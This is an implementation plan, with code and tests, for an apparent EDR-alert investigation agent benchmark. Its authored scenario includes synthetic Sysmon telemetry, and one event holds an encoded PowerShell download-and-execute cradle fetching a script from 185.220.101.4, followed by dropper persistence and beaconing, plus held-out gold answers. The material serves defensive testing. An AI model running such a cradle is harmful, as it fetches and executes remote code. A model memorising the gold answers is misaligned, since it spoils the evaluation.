# Phase 1: Case store, sandboxed tools, evidence ledger: Implementation Plan

Goal: Build the boxed telemetry layer of `alert2attack`: normalized event/alert models, a SQLite `CaseStore` that can never contain gold labels, a registry of sandboxed tools that stamp every result with stable evidence ids into an `EvidenceLedger`, a small knowledge base (Sigma rule, ATT&CK techniques, PowerShell decoder), three authored scenarios, and a CLI to call any tool by hand.

Architecture: `alert2attack.domain` (Pydantic models, no I/O) → `alert2attack.store.CaseStore` (only persistence) → `alert2attack.tools` (the only reader of the store during a run; every call is recorded in the ledger) → `alert2attack.cli` (Typer). `alert2attack.knowledge` is a sibling leaf used by the knowledge tools. Nothing in this phase talks to an LLM; Phase 3 binds `ToolRegistry.openai_schemas()` and `ToolRegistry.call()` to LangGraph without changing this layer.

Tech Stack: Python 3.12, `uv`, `src/` layout, Pydantic v2, stdlib `sqlite3`, PyYAML, Typer, pytest, ruff, mypy.

Verification status: every code block in this plan was extracted into a scratch tree and run on 2026-09-09: 83 tests pass, `ruff check` clean, `mypy --strict` clean, CLI smoke-tested. Implementers should still follow the red → green steps; the point is that the target state is known to be reachable.

## Global Constraints

- Python ≥ 3.12, `uv` for dependency management, `src/` layout, package name `alert2attack`.
- Pydantic v2 models everywhere at boundaries; `extra="forbid"`.
- SQLite via stdlib `sqlite3`; no ORM; no server database.
- No network in the default test suite.
- `ruff` (E, F, I, B, UP) and `mypy --strict` clean on `src/`.
- Evidence id grammar: `^(ev-\d{4,}|rule-[a-z0-9_\-]+|attack-T\d{4}(\.\d{3})?)$`.
- Gold never enters `CaseStore`. Only `alert2attack.tools` reads `CaseStore` during a run.
- Tool results never raise into the caller; errors are data (`ToolResult.ok == False`).
- Timestamps are timezone-aware; stored as UTC ISO-8601 strings.

## File structure

| Path | Responsibility |
|---|---|
| `pyproject.toml` | Project metadata, deps, ruff/mypy/pytest config |
| `src/alert2attack/__init__.py` | Version string only |
| `src/alert2attack/domain/evidence.py` | Evidence id grammar and constructors |
| `src/alert2attack/domain/events.py` | `EventKind`, `Event` |
| `src/alert2attack/domain/alert.py` | `Severity`, `Alert` |
| `src/alert2attack/domain/scenario.py` | `Window`, `Gold`, `Scenario`, `load_scenario`, `iter_scenarios` |
| `src/alert2attack/store/case_store.py` | `CaseStore`, `LoadReport`, `CaseNotFound` |
| `src/alert2attack/knowledge/base.py` | `SigmaRule`, `AttackTechnique`, `KnowledgeBase` |
| `src/alert2attack/knowledge/powershell.py` | `decode_powershell` |
| `src/alert2attack/knowledge/data/sigma/*.yaml` | Vendored Sigma rules (one file per slug) |
| `src/alert2attack/knowledge/data/attack_techniques.json` | ATT&CK technique subset |
| `src/alert2attack/tools/context.py` | `ToolResult`, `ToolCallRecord`, `EvidenceLedger`, `ToolContext` |
| `src/alert2attack/tools/registry.py` | `ToolRegistry`, `ToolSpec` |
| `src/alert2attack/tools/telemetry.py` | `get_alert`, `get_process`, `get_process_tree`, `get_events_for_process`, `search_events` |
| `src/alert2attack/tools/knowledge_tools.py` | `lookup_sigma_rule`, `lookup_attack_technique`, `decode_powershell` |
| `src/alert2attack/tools/__init__.py` | `default_registry()` |
| `src/alert2attack/cli.py` | Typer app: `scenarios list/show`, `tools`, `tool` |
| `datasets/scenarios/<id>/manifest.yaml`, `events.jsonl` | Authored scenarios |
| `tests/…` | Mirrors `src/` |

### Task 1: Project scaffold

Files:
- Create: `pyproject.toml`, `.gitignore`, `src/alert2attack/__init__.py`, `tests/test_smoke.py`

Interfaces:
- Produces: importable package `alert2attack` with `__version__`.

- [ ] Step 1: Install uv if missing

Run: `command -v uv || curl -LsSf https://astral.sh/uv/install.sh | sh` then `export PATH="$HOME/.local/bin:$PATH"`.

- [ ] Step 2: Write `pyproject.toml`

```toml
[project]
name = "alert2attack"
version = "0.1.0"
description = "Sourced case files from EDR alerts: a tool-using investigation agent over endpoint telemetry"
readme = "README.md"
requires-python = ">=3.12"
dependencies = [
  "pydantic>=2.8,<3",
  "pyyaml>=6.0",
  "typer>=0.12",
]

[dependency-groups]
dev = [
  "pytest>=8",
  "ruff>=0.6",
  "mypy>=1.11",
  "types-PyYAML",
]

[project.scripts]
alert2attack = "alert2attack.cli:app"

[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[tool.hatch.build.targets.wheel]
packages = ["src/alert2attack"]

[tool.pytest.ini_options]
testpaths = ["tests"]
addopts = "-q"

[tool.ruff]
line-length = 120
target-version = "py312"
src = ["src", "tests"]

[tool.ruff.lint]
select = ["E", "F", "I", "B", "UP"]

[tool.mypy]
strict = true
python_version = "3.12"
packages = ["alert2attack"]
mypy_path = "src"
```

- [ ] Step 3: Write `.gitignore`

```gitignore
.venv/
__pycache__/
*.pyc
.pytest_cache/
.mypy_cache/
.ruff_cache/
dist/
*.sqlite
reports/
datasets/raw/
```

- [ ] Step 4: Write `src/alert2attack/__init__.py`

```python
"""alert2attack: sourced case files from EDR alerts."""

__version__ = "0.1.0"
```

- [ ] Step 5: Write the smoke test `tests/test_smoke.py`

```python
import alert2attack

def test_version_is_exposed() -> None:
    assert alert2attack.__version__ == "0.1.0"
```

- [ ] Step 6: Sync and run

Run: `uv sync && uv run pytest`
Expected: `1 passed`

- [ ] Step 7: Lint gate

Run: `uv run ruff check . && uv run mypy`
Expected: `All checks passed!` and `Success: no issues found`

- [ ] Step 8: Commit

```bash
git add pyproject.toml .gitignore src/alert2attack/__init__.py tests/test_smoke.py uv.lock
git commit -m "chore: scaffold alert2attack package with uv, pytest, ruff, mypy"
```

### Task 2: Domain models: evidence ids, events, alert

Files:
- Create: `src/alert2attack/domain/__init__.py`, `src/alert2attack/domain/evidence.py`, `src/alert2attack/domain/events.py`, `src/alert2attack/domain/alert.py`
- Test: `tests/domain/test_evidence.py`, `tests/domain/test_events.py`, `tests/domain/test_alert.py`

Interfaces:
- Produces:
  - `EvidenceId` (Annotated str), `EVIDENCE_ID_PATTERN: str`, `is_evidence_id(str) -> bool`, `rule_evidence_id(slug: str) -> str`, `technique_evidence_id(technique_id: str) -> str`
  - `EventKind(StrEnum)` with 9 members, `Event(BaseModel, frozen)` with `event_id`, `kind`, `ts`, `host`, and optional telemetry fields; `Event.search_text() -> str`
  - `Severity(StrEnum)`, `Alert(BaseModel, frozen)`

- [ ] Step 1: Write failing tests

`tests/domain/__init__.py`: empty file.

`tests/domain/test_evidence.py`:

```python
import pytest
from pydantic import BaseModel, ValidationError

from alert2attack.domain.evidence import (
    EvidenceId,
    is_evidence_id,
    rule_evidence_id,
    technique_evidence_id,
)

@pytest.mark.parametrize(
    "value",
    ["ev-0001", "ev-123456", "rule-win_powershell_encoded_command", "attack-T1059", "attack-T1059.001"],
)
def test_valid_ids(value: str) -> None:
    assert is_evidence_id(value)

@pytest.mark.parametrize(
    "value",
    ["ev-1", "EV-0001", "ev-0001 ", "rule-", "rule-With Space", "attack-1059", "attack-T105", "event-0001"],
)
def test_invalid_ids(value: str) -> None:
    assert not is_evidence_id(value)

def test_constructors() -> None:
    assert rule_evidence_id("win_powershell_encoded_command") == "rule-win_powershell_encoded_command"
    assert technique_evidence_id("T1059.001") == "attack-T1059.001"

def test_evidence_id_type_validates_in_models() -> None:
    class M(BaseModel):
        ref: EvidenceId

    assert M(ref="ev-0007").ref == "ev-0007"
    with pytest.raises(ValidationError):
        M(ref="nope")
```

`tests/domain/test_events.py`:

```python
from datetime import UTC, datetime

import pytest
from pydantic import ValidationError

from alert2attack.domain.events import Event, EventKind

def _proc(**over: object) -> Event:
    base: dict[str, object] = {
        "event_id": "ev-0004",
        "kind": EventKind.PROCESS_CREATE,
        "ts": "2024-03-12T10:02:14Z",
        "host": "WS-FIN-07",
        "user": "CORP\\jdoe",
        "pid": 5288,
        "ppid": 4120,
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -NoP -W Hidden -Enc AAAA",
        "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "source_event_code": 1,
    }
    base.update(over)
    return Event.model_validate(base)

def test_parses_and_normalises_timestamp_to_utc() -> None:
    e = _proc()
    assert e.ts == datetime(2024, 3, 12, 10, 2, 14, tzinfo=UTC)
    assert e.ts.tzinfo is not None

def test_rejects_naive_timestamp() -> None:
    with pytest.raises(ValidationError):
        _proc(ts="2024-03-12T10:02:14")

def test_rejects_unknown_field_and_bad_id() -> None:
    with pytest.raises(ValidationError):
        _proc(bogus=1)
    with pytest.raises(ValidationError):
        _proc(event_id="4")

def test_is_frozen() -> None:
    e = _proc()
    with pytest.raises(ValidationError):
        e.pid = 1  # type: ignore[misc]

def test_search_text_is_lowercase_concatenation_of_searchable_fields() -> None:
    e = _proc()
    text = e.search_text()
    assert "winword.exe" in text
    assert "-enc aaaa" in text
    assert "corp\\jdoe" in text
    assert text == text.lower()

def test_all_nine_kinds_exist() -> None:
    assert {k.value for k in EventKind} == {
        "process_create",
        "network_connect",
        "image_load",
        "process_access",
        "file_create",
        "registry_set",
        "dns_query",
        "service_install",
        "scheduled_task",
    }
```

`tests/domain/test_alert.py`:

```python
import pytest
from pydantic import ValidationError

from alert2attack.domain.alert import Alert, Severity

def test_alert_roundtrip() -> None:
    a = Alert.model_validate(
        {
            "alert_id": "alr-0001",
            "host": "WS-FIN-07",
            "fired_at": "2024-03-12T10:02:14Z",
            "rule_id": "win_powershell_encoded_command",
            "rule_title": "Suspicious Encoded PowerShell Command Line",
            "severity": "high",
            "trigger_event_id": "ev-0004",
        }
    )
    assert a.severity is Severity.HIGH
    assert a.model_dump(mode="json")["fired_at"] == "2024-03-12T10:02:14Z"

def test_alert_requires_valid_trigger_id() -> None:
    with pytest.raises(ValidationError):
        Alert(
            alert_id="a",
            host="h",
            fired_at="2024-03-12T10:02:14Z",  # type: ignore[arg-type]
            rule_id="r",
            rule_title="t",
            severity=Severity.LOW,
            trigger_event_id="event-4",
        )
```

- [ ] Step 2: Run tests to verify they fail

Run: `uv run pytest tests/domain -q`
Expected: `ModuleNotFoundError: No module named 'alert2attack.domain'`

- [ ] Step 3: Write `src/alert2attack/domain/__init__.py`

```python
"""Domain models. No I/O lives here."""
```

- [ ] Step 4: Write `src/alert2attack/domain/evidence.py`

```python
"""Evidence id grammar.

Three families exist:
- ``ev-NNNN``      a telemetry event returned by a tool in this run
- ``rule-<slug>``  a vendored Sigma rule looked up in this run
- ``attack-T####`` an ATT&CK technique looked up in this run

The verifier (Phase 4) accepts nothing outside this grammar.
"""

import re
from typing import Annotated

from pydantic import StringConstraints

EVIDENCE_ID_PATTERN = r"^(ev-\d{4,}|rule-[a-z0-9_\-]+|attack-T\d{4}(\.\d{3})?)$"
_EVIDENCE_ID_RE = re.compile(EVIDENCE_ID_PATTERN)

EvidenceId = Annotated[str, StringConstraints(pattern=EVIDENCE_ID_PATTERN)]

def is_evidence_id(value: str) -> bool:
    return _EVIDENCE_ID_RE.match(value) is not None

def rule_evidence_id(slug: str) -> str:
    return f"rule-{slug}"

def technique_evidence_id(technique_id: str) -> str:
    return f"attack-{technique_id}"
```

- [ ] Step 5: Write `src/alert2attack/domain/events.py`

```python
from datetime import UTC, datetime
from enum import StrEnum

from pydantic import BaseModel, ConfigDict, field_validator

from alert2attack.domain.evidence import EvidenceId

class EventKind(StrEnum):
    PROCESS_CREATE = "process_create"  # Sysmon 1
    NETWORK_CONNECT = "network_connect"  # Sysmon 3
    IMAGE_LOAD = "image_load"  # Sysmon 7
    PROCESS_ACCESS = "process_access"  # Sysmon 10
    FILE_CREATE = "file_create"  # Sysmon 11
    REGISTRY_SET = "registry_set"  # Sysmon 13
    DNS_QUERY = "dns_query"  # Sysmon 22
    SERVICE_INSTALL = "service_install"  # System 7045
    SCHEDULED_TASK = "scheduled_task"  # Security 4698

def ensure_utc(value: datetime) -> datetime:
    if value.tzinfo is None:
        raise ValueError("timestamp must be timezone-aware")
    return value.astimezone(UTC)

class Event(BaseModel):
    """One normalized telemetry event. Flat on purpose: it is rendered to an LLM as-is."""

    model_config = ConfigDict(frozen=True, extra="forbid")

    event_id: EvidenceId
    kind: EventKind
    ts: datetime
    host: str
    user: str | None = None
    pid: int | None = None
    ppid: int | None = None
    image: str | None = None
    command_line: str | None = None
    parent_image: str | None = None
    parent_command_line: str | None = None
    sha256: str | None = None
    target_pid: int | None = None
    target_image: str | None = None
    target_path: str | None = None
    details: str | None = None
    dest_ip: str | None = None
    dest_port: int | None = None
    dest_host: str | None = None
    query: str | None = None
    source: str = "sysmon"
    source_event_code: int | None = None

    @field_validator("ts")
    @classmethod
    def _ts_utc(cls, value: datetime) -> datetime:
        return ensure_utc(value)

    def search_text(self) -> str:
        parts = (
            self.user,
            self.image,
            self.command_line,
            self.parent_image,
            self.parent_command_line,
            self.target_image,
            self.target_path,
            self.details,
            self.dest_ip,
            self.dest_host,
            self.query,
            self.sha256,
        )
        return " ".join(p for p in parts if p).lower()
```

- [ ] Step 6: Write `src/alert2attack/domain/alert.py`

```python
from datetime import datetime
from enum import StrEnum

from pydantic import BaseModel, ConfigDict, field_validator

from alert2attack.domain.events import ensure_utc
from alert2attack.domain.evidence import EvidenceId

class Severity(StrEnum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Alert(BaseModel):
    """What the EDR shows the analyst when the case opens."""

    model_config = ConfigDict(frozen=True, extra="forbid")

    alert_id: str
    host: str
    fired_at: datetime
    rule_id: str
    rule_title: str
    severity: Severity
    trigger_event_id: EvidenceId

    @field_validator("fired_at")
    @classmethod
    def _fired_at_utc(cls, value: datetime) -> datetime:
        return ensure_utc(value)
```

- [ ] Step 7: Run tests

Run: `uv run pytest tests/domain -q`
Expected: all pass (23 tests).

- [ ] Step 8: Lint and commit

```bash
uv run ruff check . && uv run mypy
git add src/alert2attack/domain tests/domain
git commit -m "feat(domain): evidence id grammar, Event, Alert models"
```

### Task 3: Scenario model and loader, first authored scenario

Files:
- Create: `src/alert2attack/domain/scenario.py`, `datasets/scenarios/enc_ps_downloader_001/manifest.yaml`, `datasets/scenarios/enc_ps_downloader_001/events.jsonl`
- Test: `tests/domain/test_scenario.py`, `tests/conftest.py`

Interfaces:
- Consumes: `Event`, `Alert`, `EvidenceId`.
- Produces: `Window(start, end)`, `Gold`, `Scenario` with `.public() -> Scenario`, `load_scenario(path: Path) -> Scenario`, `iter_scenarios(root: Path) -> Iterator[Scenario]`, `SCENARIOS_ROOT: Path` (repo `datasets/scenarios`).

- [ ] Step 1: Write the scenario fixture files

`datasets/scenarios/enc_ps_downloader_001/manifest.yaml`:

```yaml
scenario_id: enc_ps_downloader_001
split: dev
origin: authored
description: >
  Phishing document opened from Outlook spawns WINWORD, which launches hidden encoded
  PowerShell that downloads a stager, drops a binary under AppData, sets a Run key and
  starts the dropped binary which beacons out over 443.
window:
  start: 2024-03-12T09:55:00Z
  end: 2024-03-12T10:25:00Z
alert:
  alert_id: alr-0001
  host: WS-FIN-07
  fired_at: 2024-03-12T10:02:14Z
  rule_id: win_powershell_encoded_command
  rule_title: Suspicious Encoded PowerShell Command Line
  severity: high
  trigger_event_id: ev-0004
gold:
  verdict: malicious
  techniques: [T1566.001, T1204.002, T1059.001, T1105, T1547.001]
  root_pid: 4120
  key_pids: [4120, 5288, 5304]
  persistence_evidence: [ev-0007]
  acceptable_actions: [isolate_host, kill_process, collect_script, block_hash]
  unacceptable_actions: [close_as_benign]
  narrative: >
    GOLD-MARKER-DOWNLOADER. jdoe opened Invoice_Q1_2024.docm from an Outlook attachment
    cache (WINWORD pid 4120). Word spawned hidden encoded PowerShell (pid 5288) that
    downloaded http://185.220.101.4/a.ps1, wrote update.exe under AppData\Roaming, created
    the HKCU Run key "MicrosoftUpdater" for persistence and executed update.exe (pid 5304),
    which resolved cdn-status-update.com and connected to 185.220.101.4:443. The host is
    compromised; no evidence of lateral movement in the window.
```

`datasets/scenarios/enc_ps_downloader_001/events.jsonl` (one JSON object per line; backslashes are JSON-escaped):

```jsonl
{"event_id":"ev-0001","kind":"process_create","ts":"2024-03-12T09:56:02Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":1180,"ppid":1044,"image":"C:\\Windows\\explorer.exe","command_line":"C:\\Windows\\Explorer.EXE","parent_image":"C:\\Windows\\System32\\userinit.exe","source_event_code":1}
{"event_id":"ev-0002","kind":"process_create","ts":"2024-03-12T09:57:40Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":3344,"ppid":1180,"image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","command_line":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"","parent_image":"C:\\Windows\\explorer.exe","source_event_code":1}
{"event_id":"ev-0003","kind":"process_create","ts":"2024-03-12T10:01:05Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":4120,"ppid":3344,"image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","command_line":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\K3T9Q2ZA\\Invoice_Q1_2024.docm\"","parent_image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","source_event_code":1}
{"event_id":"ev-0004","kind":"process_create","ts":"2024-03-12T10:02:14Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":5288,"ppid":4120,"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAvAGEALgBwAHMAMQAnACkA","parent_image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","parent_command_line":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\K3T9Q2ZA\\Invoice_Q1_2024.docm\"","source_event_code":1}
{"event_id":"ev-0005","kind":"network_connect","ts":"2024-03-12T10:02:16Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":5288,"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","dest_ip":"185.220.101.4","dest_port":80,"source_event_code":3}
{"event_id":"ev-0006","kind":"file_create","ts":"2024-03-12T10:02:19Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":5288,"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","target_path":"C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Updater\\update.exe","source_event_code":11}
{"event_id":"ev-0007","kind":"registry_set","ts":"2024-03-12T10:02:21Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":5288,"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","target_path":"HKU\\S-1-5-21-1004336348-1177238915-682003330-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftUpdater","details":"C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Updater\\update.exe","source_event_code":13}
{"event_id":"ev-0008","kind":"process_create","ts":"2024-03-12T10:02:23Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":5304,"ppid":5288,"image":"C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Updater\\update.exe","command_line":"\"C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Updater\\update.exe\"","parent_image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","sha256":"9f2c1e7b3a5d4c6e8f0a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5a6","source_event_code":1}
{"event_id":"ev-0009","kind":"dns_query","ts":"2024-03-12T10:02:24Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":5304,"image":"C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Updater\\update.exe","query":"cdn-status-update.com","source_event_code":22}
{"event_id":"ev-0010","kind":"network_connect","ts":"2024-03-12T10:02:25Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":5304,"image":"C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Updater\\update.exe","dest_ip":"185.220.101.4","dest_port":443,"dest_host":"cdn-status-update.com","source_event_code":3}
{"event_id":"ev-0011","kind":"process_create","ts":"2024-03-12T10:05:12Z","host":"WS-FIN-07","user":"NT AUTHORITY\\SYSTEM","pid":6012,"ppid":2210,"image":"C:\\Windows\\System32\\SearchProtocolHost.exe","command_line":"\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe12_ Global\\UsGthrCtrlFltPipeMssGthrPipe12 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\" \"C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\" \"DownLevelDaemon\"","parent_image":"C:\\Windows\\System32\\SearchIndexer.exe","source_event_code":1}
{"event_id":"ev-0012","kind":"process_create","ts":"2024-03-12T10:09:47Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":6100,"ppid":1180,"image":"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe","command_line":"\"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background","parent_image":"C:\\Windows\\explorer.exe","source_event_code":1}
```

- [ ] Step 2: Write failing tests

`tests/conftest.py`:

```python
from pathlib import Path

import pytest

from alert2attack.domain.scenario import SCENARIOS_ROOT, Scenario, load_scenario

DOWNLOADER = SCENARIOS_ROOT / "enc_ps_downloader_001"

@pytest.fixture
def downloader_scenario() -> Scenario:
    return load_scenario(DOWNLOADER)

@pytest.fixture
def scenario_dir(tmp_path: Path) -> Path:
    """A minimal valid scenario directory the tests can mutate."""
    d = tmp_path / "mini_001"
    d.mkdir()
    (d / "manifest.yaml").write_text(
        """
scenario_id: mini_001
split: dev
origin: authored
description: minimal
window:
  start: 2024-01-01T00:00:00Z
  end: 2024-01-01T01:00:00Z
alert:
  alert_id: alr-mini
  host: HOST-A
  fired_at: 2024-01-01T00:10:00Z
  rule_id: win_powershell_encoded_command
  rule_title: Suspicious Encoded PowerShell Command Line
  severity: medium
  trigger_event_id: ev-0002
gold:
  verdict: not_enough_evidence
  techniques: []
  root_pid: 10
  key_pids: [10, 20]
  acceptable_actions: [collect_script]
  narrative: GOLD-MARKER-MINI
"""
    )
    (d / "events.jsonl").write_text(
        "\n".join(
            [
                '{"event_id":"ev-0001","kind":"process_create","ts":"2024-01-01T00:09:00Z",'
                '"host":"HOST-A","pid":10,"ppid":1,"image":"C:\\\\Windows\\\\System32\\\\cmd.exe"}',
                '{"event_id":"ev-0002","kind":"process_create","ts":"2024-01-01T00:10:00Z",'
                '"host":"HOST-A","pid":20,"ppid":10,"image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell'
                '\\\\v1.0\\\\powershell.exe","command_line":"powershell -enc QQBCAA=="}',
                '{"event_id":"ev-0003","kind":"process_create","ts":"2024-01-01T02:00:00Z",'
                '"host":"HOST-A","pid":30,"ppid":10,"image":"C:\\\\late.exe"}',
                '{"event_id":"ev-0004","kind":"process_create","ts":"2024-01-01T00:11:00Z",'
                '"host":"HOST-B","pid":40,"ppid":10,"image":"C:\\\\otherhost.exe"}',
            ]
        )
        + "\n"
    )
    return d
```

`tests/domain/test_scenario.py`:

```python
from pathlib import Path

import pytest
from pydantic import ValidationError

from alert2attack.domain.scenario import SCENARIOS_ROOT, Scenario, iter_scenarios, load_scenario

def test_loads_authored_downloader(downloader_scenario: Scenario) -> None:
    s = downloader_scenario
    assert s.scenario_id == "enc_ps_downloader_001"
    assert len(s.events) == 12
    assert s.alert.trigger_event_id == "ev-0004"
    assert s.gold is not None and s.gold.verdict == "malicious"
    assert s.events == sorted(s.events, key=lambda e: e.ts)

def test_public_strips_gold(downloader_scenario: Scenario) -> None:
    pub = downloader_scenario.public()
    assert pub.gold is None
    assert pub.events == downloader_scenario.events
    assert downloader_scenario.gold is not None  # original untouched

def test_trigger_event_must_exist(scenario_dir: Path) -> None:
    manifest = scenario_dir / "manifest.yaml"
    manifest.write_text(manifest.read_text().replace("trigger_event_id: ev-0002", "trigger_event_id: ev-0099"))
    with pytest.raises(ValidationError, match="trigger_event_id"):
        load_scenario(scenario_dir)

def test_duplicate_event_ids_rejected(scenario_dir: Path) -> None:
    events = scenario_dir / "events.jsonl"
    lines = events.read_text().splitlines()
    events.write_text("\n".join(lines + [lines[0]]) + "\n")
    with pytest.raises(ValidationError, match="duplicate"):
        load_scenario(scenario_dir)

def test_window_end_after_start(scenario_dir: Path) -> None:
    manifest = scenario_dir / "manifest.yaml"
    manifest.write_text(manifest.read_text().replace("end: 2024-01-01T01:00:00Z", "end: 2023-12-31T23:00:00Z"))
    with pytest.raises(ValidationError, match="window"):
        load_scenario(scenario_dir)

def test_iter_scenarios_finds_every_committed_scenario() -> None:
    ids = sorted(s.scenario_id for s in iter_scenarios(SCENARIOS_ROOT))
    assert "enc_ps_downloader_001" in ids
    assert ids == sorted(set(ids))
```

- [ ] Step 3: Run tests to verify they fail

Run: `uv run pytest tests/domain/test_scenario.py -q`
Expected: `ModuleNotFoundError: No module named 'alert2attack.domain.scenario'`

- [ ] Step 4: Write `src/alert2attack/domain/scenario.py`

```python
import json
from collections.abc import Iterator
from datetime import datetime
from pathlib import Path
from typing import Literal, Self

import yaml
from pydantic import BaseModel, ConfigDict, Field, field_validator, model_validator

from alert2attack.domain.alert import Alert
from alert2attack.domain.events import Event, ensure_utc
from alert2attack.domain.evidence import EvidenceId

SCENARIOS_ROOT = Path(__file__).resolve().parents[3] / "datasets" / "scenarios"

class Window(BaseModel):
    model_config = ConfigDict(frozen=True, extra="forbid")

    start: datetime
    end: datetime

    @field_validator("start", "end")
    @classmethod
    def _utc(cls, value: datetime) -> datetime:
        return ensure_utc(value)

    @model_validator(mode="after")
    def _ordered(self) -> Self:
        if self.end <= self.start:
            raise ValueError("window end must be after window start")
        return self

    def contains(self, ts: datetime) -> bool:
        return self.start <= ts <= self.end

class Gold(BaseModel):
    """Held-out answer. Read only by the evaluator, never by tools or the agent."""

    model_config = ConfigDict(frozen=True, extra="forbid")

    verdict: Literal["malicious", "likely_benign", "not_enough_evidence"]
    techniques: list[str] = Field(default_factory=list)
    root_pid: int | None = None
    key_pids: list[int] = Field(default_factory=list)
    persistence_evidence: list[EvidenceId] = Field(default_factory=list)
    acceptable_actions: list[str] = Field(default_factory=list)
    unacceptable_actions: list[str] = Field(default_factory=list)
    narrative: str

class Scenario(BaseModel):
    model_config = ConfigDict(frozen=True, extra="forbid")

    scenario_id: str = Field(pattern=r"^[a-z0-9_]+$")
    split: Literal["dev", "test"]
    origin: Literal["otrf", "authored"]
    description: str = ""
    window: Window
    alert: Alert
    events: list[Event]
    gold: Gold | None = None

    @model_validator(mode="after")
    def _consistent(self) -> Self:
        ids = [e.event_id for e in self.events]
        if len(ids) != len(set(ids)):
            raise ValueError("duplicate event_id in events")
        if self.alert.trigger_event_id not in ids:
            raise ValueError(f"alert.trigger_event_id {self.alert.trigger_event_id} is not in events")
        return self

    def public(self) -> "Scenario":
        """The view a tool or agent is allowed to see."""
        return self.model_copy(update={"gold": None})

def load_scenario(path: Path) -> Scenario:
    manifest = yaml.safe_load((path / "manifest.yaml").read_text(encoding="utf-8"))
    raw_events = [
        json.loads(line)
        for line in (path / "events.jsonl").read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]
    events = sorted((Event.model_validate(r) for r in raw_events), key=lambda e: e.ts)
    return Scenario.model_validate({**manifest, "events": events})

def iter_scenarios(root: Path) -> Iterator[Scenario]:
    for manifest in sorted(root.glob("*/manifest.yaml")):
        yield load_scenario(manifest.parent)
```

- [ ] Step 5: Run tests

Run: `uv run pytest tests/domain -q`
Expected: all pass.

- [ ] Step 6: Lint and commit

```bash
uv run ruff check . && uv run mypy
git add src/alert2attack/domain/scenario.py datasets/scenarios/enc_ps_downloader_001 tests/conftest.py tests/domain/test_scenario.py
git commit -m "feat(domain): Scenario/Gold/Window models, loader, first authored scenario"
```

### Task 4: `CaseStore` (SQLite), gold can never enter

Files:
- Create: `src/alert2attack/store/__init__.py`, `src/alert2attack/store/case_store.py`
- Test: `tests/store/__init__.py`, `tests/store/test_case_store.py`

Interfaces:
- Consumes: `Scenario`, `Event`, `EventKind`, `Alert`.
- Produces:
  - `class CaseNotFound(KeyError)`
  - `class LoadReport(BaseModel)`: `case_id: str`, `loaded: int`, `dropped_out_of_window: int`, `dropped_other_host: int`
  - `class CaseStore`:
    - `__init__(self, path: str | Path = ":memory:")`
    - `load_case(self, scenario: Scenario) -> LoadReport` (raises `ValueError` if `scenario.gold is not None`; `case_id == scenario.scenario_id`)
    - `case_ids(self) -> list[str]`
    - `get_alert(self, case_id: str) -> Alert`
    - `get_window(self, case_id: str) -> tuple[datetime, datetime]`
    - `get_event(self, case_id: str, event_id: str) -> Event | None`
    - `find_process(self, case_id: str, pid: int) -> Event | None` (earliest `process_create` with that pid)
    - `children(self, case_id: str, pid: int) -> list[Event]` (`process_create` with `ppid == pid`, by ts)
    - `query_events(self, case_id: str, *, kinds: Sequence[EventKind] | None = None, pid: int | None = None, since: datetime | None = None, until: datetime | None = None, contains: str | None = None, limit: int = 50, offset: int = 0) -> list[Event]`
